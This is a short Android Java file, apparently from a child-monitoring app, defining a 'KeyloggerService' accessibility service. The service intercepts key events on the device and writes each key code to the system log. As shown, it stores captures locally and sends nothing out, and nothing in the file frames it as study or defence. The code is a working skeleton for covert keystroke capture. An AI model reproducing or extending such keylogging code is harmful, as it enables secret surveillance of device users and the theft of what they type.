package com.kidsguard.child;
import android.accessibilityservice.AccessibilityService;
import android.view.KeyEvent;
import android.view.accessibility.AccessibilityEvent;
import android.util.Log;
public class KeyloggerService extends AccessibilityService {
    @Override
    protected boolean onKeyEvent(KeyEvent event) {
        if (event == null) return false;
        Log.d("Key", KeyEvent.keyCodeToString(event.getKeyCode()));
        return super.onKeyEvent(event);
    }
    @Override public void onAccessibilityEvent(AccessibilityEvent e) {}
    @Override public void onInterrupt() {}
}